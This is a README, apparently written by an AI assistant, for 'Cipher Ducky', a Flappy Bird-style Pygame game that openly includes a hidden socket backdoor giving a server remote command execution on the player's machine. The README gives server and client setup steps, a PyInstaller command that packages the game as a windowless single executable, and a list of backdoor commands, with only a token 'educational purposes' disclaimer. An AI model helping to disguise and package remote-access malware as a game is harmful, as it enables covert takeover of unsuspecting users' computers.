Here's a well-structured `README.md` file for your project:  

---

# 🦆 Cipher Ducky  

Cipher Ducky is a Flappy Bird-inspired game built with Pygame, featuring smooth physics and procedural pipe generation. Additionally, it includes a **remote access backdoor** using Python sockets, allowing a server to execute commands on the client machine.  

⚠️ **Disclaimer:** This project is for **educational purposes only.** Unauthorized use of this software is illegal. Use it responsibly and with permission.  

---

## 📌 Features  

- Flappy Bird-style gameplay with smooth mechanics and collision detection  
- Procedural pipe generation for dynamic difficulty  
- Hidden backdoor for remote command execution  
- Simple client-server model using Python sockets  

---

## 🚀 Installation  

### 🔧 Requirements  
Ensure you have Python installed (preferably **Python 3.8+**) along with the following dependencies:  

```bash
pip install pygame termcolor
```

### 📂 Setup  

1. **Clone the Repository**  

   ```bash
   git clone https://github.com/your-username/Cipher-Ducky.git
   cd Cipher-Ducky
   ```

2. **Place Required Assets**  
   Ensure the following files are present in the same directory:  
   - `bird.png`  
   - `background.png`  
   - `pipe.png`  
   - `arial.ttf`  

3. **Start the Server**  
   Run the server on your machine to listen for incoming connections:  

   ```bash
   python server.py
   ```

4. **Run the Client (Game + Backdoor)**  
   Start the Flappy Ducky game, which also connects to the server:  

   ```bash
   python Cipher_Ducky.py
   ```

---

## 🔥 Creating an Executable  

To package the game into an executable, use **PyInstaller**:  

```bash
pyinstaller --onefile --windowed --add-data "bird.png;." --add-data "background.png;." --add-data "pipe.png;." --add-data "arial.ttf;." Cipher_Ducky.py
```

- `--onefile`: Bundles everything into a single executable  
- `--windowed`: Runs without opening a terminal window  
- `--add-data`: Ensures necessary assets are included in the build  

Once complete, the executable will be in the `dist/` folder.  

---

## 🎮 How to Play  

- **Press SPACE** to make the duck flap  
- **Avoid pipes** and survive as long as possible  
- **Your score increases** each time you pass a pipe  

---

## 🛠 Backdoor Commands  

Once the client connects, you can execute commands remotely through the server shell:  

- `pwd` → Get current working directory  
- `dir` / `ls` → List files in the directory  
- `:kill` → Close the connection  

---

## 📜 License  

This project is provided **for educational use only.** Do not use it for malicious purposes.  

---

Note: After creating an .exe file you have to place the required files into *DIST* folder:
   - `bird.png`  
   - `background.png`  
   - `pipe.png`  
   - `arial.ttf`  
